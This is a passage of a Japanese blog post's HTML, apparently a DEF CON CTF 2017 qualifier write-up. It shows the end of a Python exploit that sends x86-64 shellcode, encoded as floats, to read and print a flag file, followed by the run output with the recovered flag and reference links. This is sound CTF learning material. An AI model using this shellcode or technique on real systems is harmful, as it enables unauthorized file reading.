+<span id="cb22-18"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-18" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x89\xe6</span><span class="st">&#39;</span>,   <span class="co"># mov rsi, rsp</span></span>
+<span id="cb22-19"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-19" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x31\xc0</span><span class="st">&#39;</span>,   <span class="co"># xor rax, rax</span></span>
+<span id="cb22-20"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-20" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x89\xc7</span><span class="st">&#39;</span>,   <span class="co"># mov rdi, rax</span></span>
+<span id="cb22-21"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-21" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x8d\x50\x10</span><span class="st">&#39;</span>,   <span class="co"># lea rdx, [rax+10]</span></span>
+<span id="cb22-22"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-22" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x01\xd2</span><span class="st">&#39;</span>,   <span class="co"># add rdx, rdx (rdx=0x20)</span></span>
+<span id="cb22-23"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-23" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x01\xd2</span><span class="st">&#39;</span>,   <span class="co"># add rdx, rdx (rdx=0x40)</span></span>
+<span id="cb22-24"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-24" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x01\xd2</span><span class="st">&#39;</span>,   <span class="co"># add rdx, rdx (rdx=0x80)</span></span>
+<span id="cb22-25"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-25" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x0f\x05\x90</span><span class="st">&#39;</span>,   <span class="co"># syscall ; nop</span></span>
+<span id="cb22-26"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-26" aria-hidden="true" tabindex="-1"></a>    <span class="co"># save big number</span></span>
+<span id="cb22-27"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-27" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x49\x89\xd0</span><span class="st">&#39;</span>,   <span class="co"># mov r8, rdx</span></span>
+<span id="cb22-28"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-28" aria-hidden="true" tabindex="-1"></a>    <span class="co"># open(stack, 0, 0)</span></span>
+<span id="cb22-29"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-29" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x89\xf7</span><span class="st">&#39;</span>,   <span class="co"># mov rdi, rsi</span></span>
+<span id="cb22-30"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-30" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x31\xf6</span><span class="st">&#39;</span>,   <span class="co"># xor rsi, rsi</span></span>
+<span id="cb22-31"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-31" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x31\xd2</span><span class="st">&#39;</span>,   <span class="co"># xor rdx, rdx</span></span>
+<span id="cb22-32"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-32" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x8d\x42\x02</span><span class="st">&#39;</span>,   <span class="co"># lea rax, [rdx+2]</span></span>
+<span id="cb22-33"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-33" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x0f\x05\x90</span><span class="st">&#39;</span>,   <span class="co"># syscall ; nop</span></span>
+<span id="cb22-34"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-34" aria-hidden="true" tabindex="-1"></a>    <span class="co"># read(fd, stack, 0x80)</span></span>
+<span id="cb22-35"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-35" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x89\xc7</span><span class="st">&#39;</span>,   <span class="co"># mov rdi, rax</span></span>
+<span id="cb22-36"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-36" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x89\xe6</span><span class="st">&#39;</span>,   <span class="co"># mov rsi, rsp</span></span>
+<span id="cb22-37"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-37" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x4c\x89\xc2</span><span class="st">&#39;</span>,   <span class="co"># mov rdx, r8</span></span>
+<span id="cb22-38"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-38" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x31\xc0</span><span class="st">&#39;</span>,   <span class="co"># xor rax, rax</span></span>
+<span id="cb22-39"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-39" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x0f\x05\x90</span><span class="st">&#39;</span>,   <span class="co"># syscall ; nop</span></span>
+<span id="cb22-40"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-40" aria-hidden="true" tabindex="-1"></a>    <span class="co"># write(1, rsp, 0x80)</span></span>
+<span id="cb22-41"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-41" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x4c\x89\xc2</span><span class="st">&#39;</span>,   <span class="co"># mov rdx, r8</span></span>
+<span id="cb22-42"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-42" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x31\xc0</span><span class="st">&#39;</span>,   <span class="co"># xor rax, rax</span></span>
+<span id="cb22-43"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-43" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\xff\xc0</span><span class="st">&#39;</span>,   <span class="co"># inc rax</span></span>
+<span id="cb22-44"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-44" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x48\x89\xc7</span><span class="st">&#39;</span>,   <span class="co"># mov rdi, rax</span></span>
+<span id="cb22-45"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-45" aria-hidden="true" tabindex="-1"></a>    <span class="st">&#39;</span><span class="ch">\x0f\x05\x90</span><span class="st">&#39;</span>,   <span class="co"># syscall ; nop</span></span>
+<span id="cb22-46"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-46" aria-hidden="true" tabindex="-1"></a>]</span>
+<span id="cb22-47"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-47" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-48"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-48" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;send shellcode&#39;</span>)</span>
+<span id="cb22-49"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-49" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-50"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-50" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> s <span class="kw">in</span> shellcode:</span>
+<span id="cb22-51"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-51" aria-hidden="true" tabindex="-1"></a>    f <span class="op">=</span> struct.unpack(<span class="st">&#39;!f&#39;</span>, (s <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\x68</span><span class="st">&#39;</span>)[::<span class="op">-</span><span class="dv">1</span>])[<span class="dv">0</span>]</span>
+<span id="cb22-52"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-52" aria-hidden="true" tabindex="-1"></a>    s <span class="op">=</span> <span class="st">&#39;</span><span class="sc">%.64lg</span><span class="st">&#39;</span> <span class="op">%</span> f</span>
+<span id="cb22-53"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-53" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span> s</span>
+<span id="cb22-54"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-54" aria-hidden="true" tabindex="-1"></a>    r.sendline(s)</span>
+<span id="cb22-55"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-56"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-56" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="dv">25</span> <span class="op">-</span> <span class="bu">len</span>(shellcode)):</span>
+<span id="cb22-57"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-57" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="st">&#39;0&#39;</span>)</span>
+<span id="cb22-58"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-58" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-59"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-59" aria-hidden="true" tabindex="-1"></a>pause(<span class="dv">1</span>)</span>
+<span id="cb22-60"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-60" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-61"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-61" aria-hidden="true" tabindex="-1"></a>r.clean()</span>
+<span id="cb22-62"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-62" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-63"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-63" aria-hidden="true" tabindex="-1"></a>r.sendline(<span class="st">&#39;flag&#39;</span>.ljust(<span class="bn">0x7f</span>, <span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))</span>
+<span id="cb22-64"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-64" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-65"><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-65" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
+<pre><code>$ ./exploit.py remote
+[+] Opening connection to floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me on port 754: Done
+[*] send shellcode
+8709413465159098708262912
+7260827546538835038961664
+7538266577407426695266304
+2726026692719540090961920
+7933764770347759481913344
+7933764770347759481913344
+7933764770347759481913344
+5440912704940064219594752
+7878277540634793454075904
+9351655306829370457325568
+9300889867138521771278336
+7940848320072063949733888
+2460541152010712224104448
+5440912704940064219594752
+7538266577407426695266304
+8709413465159098708262912
+7349374223935650100412416
+7260827546538835038961664
+5440912704940064219594752
+7349374223935650100412416
+7260827546538835038961664
+7291227780772308380024832
+7538266577407426695266304
+5440912704940064219594752
+[+] Waiting: Done
+[*] Switching to interactive mode
+The flag is: l00ks_l1k3_w3_g0t_0ur53lv35_4_fl04t3r
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00flag\x00\x00\x00\x00[*] Got EOF while reading in interactive
+$ 
+[*] Closed connection to floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me port 754</code></pre>
+<p>よくわかっていなかった浮動小数点値の扱い方も知ることができてよかった.</p>
+<h2 id="参考リンク">参考リンク</h2>
+<ul>
+<li><a href="http://warabanshi.hatenablog.com/entry/2014/05/21/001419" target="_blank" rel="nofollow noopener">原書で学ぶ64bitアセンブラ入門（6） - わらばんし仄聞記</a></li>
+<li><a href="http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.html" target="_blank" rel="nofollow noopener">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2 (2A, 2B, 2C &amp; 2D): Instruction Set Reference, A-Z</a></li>
+<li><a href="http://inaz2.hatenablog.com/entry/2014/03/13/013056" target="_blank" rel="nofollow noopener">Linux x86用のシェルコードを書いてみる - ももいろテクノロジー</a></li>
+<li><a href="http://stackoverflow.com/a/1592362" target="_blank" rel="nofollow noopener">python - Convert hex to float - Stack Overflow</a></li>
+</ul>
+<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1" role="doc-endnote"><p>これの一種かな? <a href="https://gcc.gnu.org/onlinedocs/gcc-5.4.0/gcc/Function-Attributes.html" target="_blank" rel="nofollow noopener">Function Attributes - Using the GNU Compiler Collection (GCC)</a><a href="/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section></div><aside class="comments"><div id="disqus_thread"></div><script>(function() { var d = document, s = d.createElement('script');s.src = 'https://tosainu.disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s); })();</script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="nofollow noopener">comments powered by Disqus.</a></noscript></aside></div></article></main><footer class="site-footer"><div class="footer-widgets"><div class="container"><div class="col"><section class="about-me"><h4><svg class="svg-inline--fa fa-user fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="user" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0S96 57.3 96 128s57.3 128 128 128zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512H418.3c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304H178.3z" fill="currentColor"></path></svg> About Me</h4><div class="about"><div class="avatar"><img src="/images/icon/cocoa.svg" class="icon" alt="avatar"></div><div class="info"><div class="name"><a href="https://myon.info" target="_blank" rel="nofollow noopener">Tosainu</a></div><div class="info">❤ Arch Linux, ごちうさ</div></div></div></section><section class="recent-posts"><h4><svg class="svg-inline--fa fa-file fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 384 512" data-icon="file" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M0 64C0 28.7 28.7 0 64 0H224V128c0 17.7 14.3 32 32 32H384V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V64zm384 64H256V0L384 128z" fill="currentColor"></path></svg> Recent Posts</h4><ul><li><a href="/entry/2022/09/19/earthly-zynqmp/">とにかく複雑な Zynq のソフトウェアを Earthly でビルドする</a></li><li><a href="/entry/2020/11/29/archlinux-arm-on-zu/">Ultra96 で Arch Linux ARM を動かす</a></li><li><a href="/entry/2020/09/01/thinkpad-x13/">ThinkPad X13 を買いました</a></li><li><a href="/entry/2020/07/05/bus-blaster/">Bus Blaster で Raspberry Pi Model B を JTAG デバッグしてみる</a></li><li><a href="/entry/2019/10/21/make-own-language-and-compiler/">Brainf**k からはじめる自作コンパイラ</a></li></ul></section></div><section class="tag-cloud"><h4><svg class="svg-inline--fa fa-tags fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="tags" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M345 39.1L472.8 168.4c52.4 53 52.4 138.2 0 191.2L360.8 472.9c-9.3 9.4-24.5 9.5-33.9 .2s-9.5-24.5-.2-33.9L438.6 325.9c33.9-34.3 33.9-89.4 0-123.7L310.9 72.9c-9.3-9.4-9.2-24.6 .2-33.9s24.6-9.2 33.9 .2zM0 229.5V80C0 53.5 21.5 32 48 32H197.5c17 0 33.3 6.7 45.3 18.7l168 168c25 25 25 65.5 0 90.5L277.3 442.7c-25 25-65.5 25-90.5 0l-168-168C6.7 262.7 0 246.5 0 229.5zM144 144c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32z" fill="currentColor"></path></svg> Tags</h4><ul class="tag-list"><li><a href="/entry/tags/android/"><span>Android</span></a></li><li><a href="/entry/tags/arch-linux/"><span>Arch Linux</span></a></li><li><a href="/entry/tags/arduino/"><span>Arduino</span></a></li><li><a href="/entry/tags/c/"><span>C++</span></a></li><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li><li><a href="/entry/tags/diy-pc/"><span>DIY PC</span></a></li><li><a href="/entry/tags/docker/"><span>Docker</span></a></li><li><a href="/entry/tags/fpga/"><span>FPGA</span></a></li><li><a href="/entry/tags/game/"><span>Game</span></a></li><li><a href="/entry/tags/gochiusa/"><span>Gochiusa</span></a></li><li><a href="/entry/tags/hakyll/"><span>Hakyll</span></a></li><li><a href="/entry/tags/haskell/"><span>Haskell</span></a></li><li><a href="/entry/tags/linux/"><span>Linux</span></a></li><li><a href="/entry/tags/machine-learning/"><span>Machine learning</span></a></li><li><a href="/entry/tags/network/"><span>Network</span></a></li><li><a href="/entry/tags/raspberry-pi/"><span>Raspberry Pi</span></a></li><li><a href="/entry/tags/rust/"><span>Rust</span></a></li><li><a href="/entry/tags/slack/"><span>Slack</span></a></li><li><a href="/entry/tags/thinkpad-x13/"><span>ThinkPad X13</span></a></li><li><a href="/entry/tags/vaio-z2/"><span>VAIO Z2</span></a></li><li><a href="/entry/tags/vim/"><span>Vim</span></a></li><li><a href="/entry/tags/walkmanz/"><span>WalkmanZ</span></a></li><li><a href="/entry/tags/website/"><span>Website</span></a></li><li><a href="/entry/tags/xperia-nx/"><span>Xperia NX</span></a></li><li><a href="/entry/tags/xperia-arc/"><span>Xperia arc</span></a></li><li><a href="/entry/tags/xperia2011/"><span>Xperia2011</span></a></li><li><a href="/entry/tags/seccamp/"><span>seccamp</span></a></li></ul></section><section class="archives"><h4><svg class="svg-inline--fa fa-box-archive fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="box-archive" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M32 32H480c17.7 0 32 14.3 32 32V96c0 17.7-14.3 32-32 32H32C14.3 128 0 113.7 0 96V64C0 46.3 14.3 32 32 32zm0 128H480V416c0 35.3-28.7 64-64 64H96c-35.3 0-64-28.7-64-64V160zm128 80c0 8.8 7.2 16 16 16H336c8.8 0 16-7.2 16-16s-7.2-16-16-16H176c-8.8 0-16 7.2-16 16z" fill="currentColor"></path></svg> Archives</h4><ul class="archive-tree"><li><input class="tree-toggle" type="checkbox" id="tree-label-2022"><label class="tree-toggle-button" for="tree-label-2022"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2022/">2022 (1)</a></label><ul class="tree-child"><li><a href="/entry/2022/09/">2022/09 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2020"><label class="tree-toggle-button" for="tree-label-2020"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2020/">2020 (3)</a></label><ul class="tree-child"><li><a href="/entry/2020/11/">2020/11 (1)</a></li><li><a href="/entry/2020/09/">2020/09 (1)</a></li><li><a href="/entry/2020/07/">2020/07 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2019"><label class="tree-toggle-button" for="tree-label-2019"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2019/">2019 (4)</a></label><ul class="tree-child"><li><a href="/entry/2019/10/">2019/10 (1)</a></li><li><a href="/entry/2019/08/">2019/08 (2)</a></li><li><a href="/entry/2019/05/">2019/05 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2018"><label class="tree-toggle-button" for="tree-label-2018"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2018/">2018 (5)</a></label><ul class="tree-child"><li><a href="/entry/2018/10/">2018/10 (1)</a></li><li><a href="/entry/2018/09/">2018/09 (1)</a></li><li><a href="/entry/2018/08/">2018/08 (1)</a></li><li><a href="/entry/2018/03/">2018/03 (1)</a></li><li><a href="/entry/2018/01/">2018/01 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2017" checked><label class="tree-toggle-button" for="tree-label-2017"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2017/">2017 (5)</a></label><ul class="tree-child"><li><a href="/entry/2017/09/">2017/09 (1)</a></li><li><a href="/entry/2017/05/">2017/05 (1)</a></li><li><a href="/entry/2017/02/">2017/02 (3)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2016"><label class="tree-toggle-button" for="tree-label-2016"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2016/">2016 (8)</a></label><ul class="tree-child"><li><a href="/entry/2016/08/">2016/08 (2)</a></li><li><a href="/entry/2016/07/">2016/07 (1)</a></li><li><a href="/entry/2016/06/">2016/06 (1)</a></li><li><a href="/entry/2016/05/">2016/05 (1)</a></li><li><a href="/entry/2016/03/">2016/03 (1)</a></li><li><a href="/entry/2016/01/">2016/01 (2)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2015"><label class="tree-toggle-button" for="tree-label-2015"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2015/">2015 (12)</a></label><ul class="tree-child"><li><a href="/entry/2015/12/">2015/12 (1)</a></li><li><a href="/entry/2015/08/">2015/08 (1)</a></li><li><a href="/entry/2015/06/">2015/06 (2)</a></li><li><a href="/entry/2015/05/">2015/05 (2)</a></li><li><a href="/entry/2015/04/">2015/04 (1)</a></li><li><a href="/entry/2015/03/">2015/03 (2)</a></li><li><a href="/entry/2015/02/">2015/02 (1)</a></li><li><a href="/entry/2015/01/">2015/01 (2)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2014"><label class="tree-toggle-button" for="tree-label-2014"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" 